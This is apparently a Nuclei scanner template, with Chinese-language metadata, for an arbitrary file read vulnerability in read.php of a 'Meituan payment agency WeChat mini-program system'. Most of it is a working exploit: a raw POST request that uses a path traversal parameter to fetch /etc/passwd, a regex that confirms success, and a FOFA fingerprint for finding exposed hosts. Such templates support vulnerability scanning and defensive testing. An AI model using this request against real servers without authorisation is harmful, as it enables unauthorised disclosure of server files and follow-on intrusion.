id: meituan-payment-agency-wechat-app-fileread

info:
  name: 美团代付微信小程序系统read.php任意文件读取漏洞
  author: qwtd
  severity: high
  description: |
    美团代付微信小程序系统read.php文件存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器文件。
  metadata:
    fofa: body="/h5/static/js/chunk-vendors.js"
    verified: true
  tags: 美团代付微信小程序系统

http:
  - raw:
      - |
        POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        name=../../../../../../../../../etc/passwd

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
